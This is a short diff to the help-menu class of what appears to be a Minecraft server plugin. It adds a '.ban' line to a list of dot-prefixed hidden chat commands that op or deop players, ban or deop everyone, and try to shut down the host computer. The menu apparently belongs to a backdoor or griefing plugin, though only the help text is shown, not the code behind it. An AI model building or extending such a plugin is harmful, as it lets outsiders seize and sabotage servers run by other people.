@@ -32,6 +32,7 @@ public class Command_help implements Listener
                 p.sendMessage(ChatColor.GOLD + ".deop <player> - Deops a player of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".op <player> - OPs a player of your choice.");
                 p.sendMessage(ChatColor.GOLD + ".gamemode <creative|survival|adventure> - Changes your gamemode.");
+                p.sendMessage(ChatColor.GOLD + ".ban <player> - Bans a player.");
                 p.sendMessage(ChatColor.GOLD + ".banall - Bans everyone on the server.");
                 p.sendMessage(ChatColor.GOLD + ".deopall - Deops everyone online.");
                 p.sendMessage(ChatColor.GOLD + ".shutdown - Attempts to shutdown the computer the server is running on.");
